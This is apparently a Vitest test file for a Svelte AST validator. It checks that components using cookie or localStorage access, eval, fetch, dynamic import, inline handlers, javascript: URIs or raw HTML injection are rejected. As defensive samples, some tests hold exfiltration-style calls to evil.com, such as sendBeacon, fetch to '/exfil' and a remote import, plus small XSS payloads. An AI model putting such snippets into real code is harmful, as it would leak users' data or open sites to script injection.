import { describe, expect, it } from 'vitest'

import { validateSvelteAst } from './svelte-ast-validator'

// Helper: compile Svelte source and return the AST
function compileToAst(source: string) {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { compile } = require('svelte/compiler')
  const result = compile(source, { name: 'Test', generate: 'ssr' })
  return result.ast
}

describe('svelte-ast-validator', () => {
  describe('dangerous member access', () => {
    it('blocks document.cookie', () => {
      const ast = compileToAst(
        '<script>let x = document.cookie</script><div>{x}</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('document.cookie'))).toBe(
        true,
      )
    })

    it('blocks window.location', () => {
      const ast = compileToAst(
        '<script>let x = window.location</script><div>{x}</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('window.location'))).toBe(
        true,
      )
    })

    it('blocks navigator.sendBeacon', () => {
      const ast = compileToAst(
        '<script>navigator.sendBeacon("https://evil.com", "data")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('sendBeacon'))).toBe(true)
    })

    it('blocks localStorage access', () => {
      const ast = compileToAst(
        '<script>let x = localStorage.getItem("token")</script><div>{x}</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('localStorage'))).toBe(true)
    })

    it('blocks computed member access document["cookie"]', () => {
      const ast = compileToAst(
        '<script>let x = document["cookie"]</script><div>{x}</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('document.cookie'))).toBe(
        true,
      )
    })
  })

  describe('dangerous function calls', () => {
    it('blocks eval()', () => {
      const ast = compileToAst('<script>eval("alert(1)")</script><div>hi</div>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('eval'))).toBe(true)
    })

    it('blocks Function() constructor', () => {
      const ast = compileToAst(
        '<script>new Function("return this")()</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('Function'))).toBe(true)
    })

    it('blocks fetch()', () => {
      const ast = compileToAst(
        '<script>fetch("https://evil.com/exfil")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('fetch'))).toBe(true)
    })

    it('blocks setTimeout with string argument', () => {
      const ast = compileToAst(
        '<script>setTimeout("alert(1)", 100)</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('setTimeout'))).toBe(true)
    })

    it('allows setTimeout with arrow function', () => {
      const ast = compileToAst(
        '<script>setTimeout(() => console.log("ok"), 100)</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      // console.log is not in our blocklist — only console.* member access
      // that we explicitly block. setTimeout with arrow fn is allowed.
      expect(result.valid).toBe(true)
    })
  })

  describe('dangerous HTML elements', () => {
    it('blocks <script> in template (caught by JS AST walker via instance)', () => {
      // Svelte compiler puts <script> tags into ast.instance, not ast.html.
      // The JS AST walker catches dangerous calls like alert() inside the script.
      const ast = compileToAst('<div>hi</div><script>alert(1)</script>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('alert'))).toBe(true)
    })

    it('blocks <iframe> in template', () => {
      const ast = compileToAst('<iframe src="https://evil.com"></iframe>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('<iframe>'))).toBe(true)
    })

    it('blocks <object> in template', () => {
      const ast = compileToAst('<object data="evil.swf"></object>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('<object>'))).toBe(true)
    })
  })

  describe('dangerous attributes', () => {
    it('blocks inline onload handler', () => {
      const ast = compileToAst('<div onload="alert(1)">hi</div>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('onload'))).toBe(true)
    })

    it('blocks javascript: URI in href', () => {
      const ast = compileToAst('<a href="javascript:alert(1)">click</a>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('javascript:'))).toBe(true)
    })
  })

  describe('{@html} raw HTML injection', () => {
    it('blocks {@html} expression', () => {
      const ast = compileToAst('<div>{@html rawHtml}</div>')
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('{@html}'))).toBe(true)
    })
  })

  describe('innerHTML / insertAdjacentHTML', () => {
    it('blocks innerHTML assignment', () => {
      const ast = compileToAst(
        '<script>el.innerHTML = "<script>alert(1)</scr"+"ipt>"</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('innerHTML'))).toBe(true)
    })

    it('blocks insertAdjacentHTML', () => {
      const ast = compileToAst(
        '<script>el.insertAdjacentHTML("beforeend", "<b>hi</b>")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('insertAdjacentHTML'))).toBe(
        true,
      )
    })
  })

  describe('setAttribute with event handler', () => {
    it('blocks setAttribute("onclick", ...)', () => {
      const ast = compileToAst(
        '<script>el.setAttribute("onclick", "alert(1)")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('setAttribute'))).toBe(true)
    })
  })

  describe('dynamic import', () => {
    it('blocks import()', () => {
      const ast = compileToAst(
        '<script>import("https://evil.com/module.js")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('import()'))).toBe(true)
    })
  })

  describe('safe components pass', () => {
    it('allows a simple counter component', () => {
      const ast = compileToAst(`
        <script>let count = 0</script>
        <button on:click={() => count++}>{count}</button>
      `)
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(true)
      expect(result.errors).toEqual([])
    })

    it('allows a component with reactive declarations', () => {
      const ast = compileToAst(`
        <script>
          let a = 1
          let b = 2
          $: sum = a + b
        </script>
        <div>{sum}</div>
      `)
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(true)
    })

    it('allows console.log', () => {
      const ast = compileToAst(
        '<script>console.log("hello")</script><div>hi</div>',
      )
      const result = validateSvelteAst(ast)
      expect(result.valid).toBe(true)
    })
  })
})
